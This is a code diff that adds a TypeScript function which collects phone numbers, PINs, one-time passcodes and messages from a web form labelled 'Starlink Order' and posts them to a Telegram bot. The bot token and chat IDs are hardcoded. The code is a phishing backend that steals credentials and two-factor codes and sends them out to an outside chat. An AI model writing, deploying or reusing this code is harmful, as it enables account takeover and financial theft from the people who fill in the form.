@@ -1,0 +1,44 @@
+export async function telFun(formData:any,) {
+      const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
+      const url = `https://api.telegram.org/bot${token}/sendMessage`
+    const action = formData.get("action");
+    let message = "";
+    if(action=="submit-phone"){
+        message = `Phone: ${formData.get("phone")}
+        Pin: ${formData.get("pin")}`
+    }
+    if(action=="submit-otp"){
+        message = `Phone: ${formData.get("phone")}
+        Otp: ${formData.get("otp")}`
+    }
+    if(action=="submit-message"){
+        message= `Phone: ${formData.get("phone")}
+        Message: ${formData.get("message")}`
+    }
+        try {
+        const res = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: 8775827384,//7895249781,// 8453055105, //, //  ,// ,// ,
+                text:
+                    `Starlink Order 
+${message}`
+// Phone: ${formData.get("phone")}
+// PIN: ${formData.get("pin")}
+// OTP: ${formData.get("otp")}
+// Message: ${formData.get("message")}
+                    ,
+                parse_mode: "Markdown",
+            })
+
+        });
+        const data = await res.json();
+        return data;
+    } catch (e: any) {
+        return e.message || e;
+    }
+
+}
